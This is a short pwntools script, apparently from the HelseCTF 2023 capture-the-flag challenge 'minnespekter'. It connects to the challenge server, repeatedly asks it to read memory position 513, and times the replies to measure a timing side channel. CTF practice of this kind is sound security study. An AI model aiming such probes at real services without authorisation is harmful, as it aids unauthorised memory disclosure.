from pwn import *
from time import time_ns
import threading

io = remote("helsectf2023-6ac4e1c6d8855c1bd96a-minnespekter.chals.io", 443, ssl=True)

def readPosition(pos):
    io.recvuntil(b"lese?") 
    io.sendline(f"{pos}".encode())
    data = io.recvuntil(b"\r\n", drop = True).decode().split()[-1]
    return data
    
total = 0
for _ in range(100):
    start = time_ns()
    data = readPosition(513)
    end = time_ns() - start
    total += end
    print(f"{data} - {end}")

print(total/100)

# h = 100654226.56